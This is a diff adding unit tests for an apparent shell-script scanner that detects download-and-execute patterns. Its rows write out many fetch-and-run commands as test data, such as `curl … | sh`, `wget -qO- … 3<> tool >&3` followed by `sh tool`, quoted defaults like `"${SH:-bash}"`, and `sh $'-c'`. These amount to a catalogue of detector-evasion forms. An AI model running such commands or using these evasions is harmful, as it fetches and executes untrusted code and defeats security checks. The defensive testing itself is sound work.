@@ -634,6 +634,116 @@ class TestTheWholeWordIsTheCommandWordsAlone(unittest.TestCase):
                     self.assertFalse(reported(row + "\necho done\n", shell))
 
 
+class TestAQuotedShellDefaultIsTheShellItNames(unittest.TestCase):
+    """PR #2856 round 9, the round-8 verdict's B1: `"${SH:-bash}"` is one word, every `$` of it
+    quoted, and the command layer reads it as the base did (#2337) -- a default holding no blank
+    -- so a pipe into it, or `SH=1` then `"${SH:+sh}" tool`, runs the shell it names. Round 8 read
+    no quoted word as a default at all (21 rows, `main` and the base RRRRRRRR). A quoted default
+    holding a blank names no shell: bash runs a command named ` bash` (KQp0, KQp1, KQp4)."""
+
+    PIPED = ['cat tool | "${SH:-bash}"', 'cat tool | "${SH-sh}"', 'cat tool | "${SH:=sh}"',
+             'cat tool | "${SH:-/bin/sh}"']                                              # KGa16-KGd16
+    ALTERNATE = ['"${SH:+sh}" tool', '"${SH:+sh}" ./tool', '"${SH:+sh}" -e tool', '"${SH:+sh}" -- tool',
+                 'cat tool | "${SH:+sh}"', 'F=tool\n"${SH:+sh}" $F', 'F=tool\n"${SH:+sh}" "$F"',
+                 'eval \'"${SH:+sh}" tool\'', 'if "${SH:+sh}" tool; then :; fi', '! "${SH:+sh}" tool',
+                 '{ "${SH:+sh}" tool; }', '( "${SH:+sh}" tool )', 'X0=1 "${SH:+sh}" tool',
+                 '"${SH:+sh}" -x tool', '"${SH:+sh}" -eu tool', 'SH=sh\n"${SH:+sh}" tool']  # KGe09-KGe46
+    REPORT = [GET + row for row in PIPED] + ["SH=1\n" + GET + row for row in ALTERNATE] + [
+        'SH=1\ncurl -fsSL %si.sh > i.sh\n"${SH:+sh}" i.sh' % URL]                      # KGe39
+    CLEAN = [GET + row for row in ('cat tool | "${SH:- bash}"', 'cat tool | "${SH:-bash }"',
+                                   'cat tool | "${SH:-\tsh}"')]
+
+    def test_each_quoted_default_main_reports_is_reported(self):
+        self.assertEqual(21, len(self.REPORT))
+        for row in self.REPORT:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_a_quoted_default_holding_a_blank_names_no_shell(self):
+        for row in self.CLEAN:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(row + "\necho done\n", shell))
+
+
+class TestADupPutsTheDownloadInTheFileItsDescriptorOpened(unittest.TestCase):
+    """PR #2856 round 9, the coordinator's F5 ruling: `N<> file` opens the file on descriptor N for
+    reading and writing, fd 0 reads it, and a later `>&N` or `1>&N` writes to it -- so the download
+    lands in the file, and its use runs it. `main` reads `N<` then a `> file` the dup overrides, and
+    reads every one CLEAN. The 32 rows are RRRRRRRR (hunts 11, 13 and 16 of the round-8 seat)."""
+
+    USES = ("sh tool", "bash tool", "sh < tool", "chmod +x tool\n./tool", "cat tool | sh", ". ./tool")
+    THREE = ("sh tool", "sh < tool", "chmod +x tool\n./tool")
+    REPORT = ([("wget -qO- %stool 3<> tool >&3\n" % URL) + use for use in USES] +            # N03a-f
+              [("curl -fsSL %stool 3<>tool 1>&3\n" % URL) + use for use in USES] +          # N04a-f
+              [("curl -fsSL %stool 2<> tool 1>&2\n" % URL) + use for use in USES] +         # N05a-f
+              [("curl -fsSL %stool 9<> tool >&9\n" % URL) + use for use in THREE] +            # SD08a-c
+              [("curl -fsSL %stool 3<> tool 1>&3 3>&-\n" % URL) + use for use in THREE] +    # SD22a-c
+              [("curl -fsSL %stool %s\n" % (URL, dup)) + use for dup in (
+                  "3<> tool >&3", "2<> tool 1>&2", "3<>tool 1>&3", "9<>tool 1>&9 9>&-")
+               for use in ("sh tool", "sh < tool")])                                     # DI01/10/13/17a-b
+
+    def test_each_dup_row_is_reported(self):
+        self.assertEqual(32, len(self.REPORT))
+        for row in self.REPORT:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+
+class TestEachGateOfTheWholeWordHasAVerdict(unittest.TestCase):
+    """PR #2856 round 9, the round-8 verdict's F4: each test that confines the whole reading to a
+    command word moves a verdict, so each has a row here. Read whole past one, the guard reports
+    where nothing runs: `$$${X:-…}` glues the PID to the word, so no word starts at the `${` (the
+    word test); `${X:-bash -s;}` holds an operator, where `main` ends the statement (the scan's
+    stop); a function body on its header's line is past no command's head (`at_head`); and the
+    `case` subject `${a:-$${b} x}` under `sh`, where dash ends it at its first `}` and rejects the
+    line (q28: bash 3.2 reads one word and runs the arm; the `case` test).
+    And where the round-7 ruling reads a word as `main` does -- a `case` subject, a `${…}` that
+    spans a line -- every shell runs the payload, and `main` and the head read it CLEAN (h22,
+    CSH19, CSP19: RRRRRRRR); a gate that read them whole would close them, which the ruling
+    leaves to their own fix."""
+
+    OVER = ("$$${X:-bash -s} <<'EOF'\ncurl -fsSL %si.sh | sh\nEOF" % URL,             # PDH02 --------
+            "curl -fsSL %si.sh | $$${X:-bash -s}" % URL,                            # PDP02 ffffffff
+            "${X:-bash -s;} <<'EOF'\ncurl -fsSL %si.sh | sh\nEOF" % URL,            # CSH20 --------
+            "curl -fsSL %si.sh | ${SH:-bash -s;}" % URL,                            # CSP20 ffffffff
+            "function f { ${X:-bash -s} <<'EOF'; }\nf\ncurl -fsSL %si.sh | sh\nEOF" % URL,  # CPH15
+            "curl -fsSL %si.sh | f() { ${SH:-bash -s}; }\nf" % URL)                 # CPP14 ffffffff
+    CASE = GET + "case ${a:-$${b} x} in *) sh tool;; esac"                          # q28 ffRRffRf
+    RULED = (GET + "case ${X:-a b} in *) sh tool;; esac",                           # h22
+             "${X:-bash\n-s} <<'EOF'\ncurl -fsSL %si.sh | sh\nEOF" % URL,          # CSH19
+             "curl -fsSL %si.sh | ${SH:-bash\n-s}" % URL)                           # CSP19
+
+    def test_past_each_gate_nothing_runs_and_nothing_is_reported(self):
+        for row in self.OVER:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(row + "\necho done\n", shell))
+        for shell in ("sh", "sh {0}"):          # dash runs nothing; bash 3.2 runs the payload
+            with self.subTest(row=self.CASE, shell=shell):
+                self.assertFalse(reported(self.CASE + "\necho done\n", shell))
+
+    def test_a_word_the_ruling_leaves_to_main_reads_as_main(self):
+        for row in self.RULED:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(row + "\necho done\n", shell))
+
+
+class TestAnAnsiCWordInsideTheDefaultIsBashsText(unittest.TestCase):
+    """PR #2856 round 9, the round-8 verdict's B2: inside a command word read whole, `$'-c'` is the
+    text bash makes of it, so `${X:-sh $'-c' '…'}` is `sh -c` running the string (PCX03: RRRR-RR-,
+    bash runs the payload and dash, which has no `$'…'`, runs nothing)."""
+
+    def test_the_decoded_flag_runs_its_string_under_bash(self):
+        row = "${X:-sh $'-c' 'curl -fsSL %si.sh | sh'}" % URL
+        for shell in (None, "bash", "bash {0}"):
+            with self.subTest(shell=shell):
+                self.assertTrue(reported(row + "\necho done\n", shell))
+
+
 class TestTheClosedRowsTheSeatAskedPinned(unittest.TestCase):
     """The #2856 seat's round-1 note 2: a comment line between `|` and `sh`, `${X:-sh -c}`
     inside `eval`, a `-c` string and a heredoc, `sh <> tool`, and the two-line check gate,
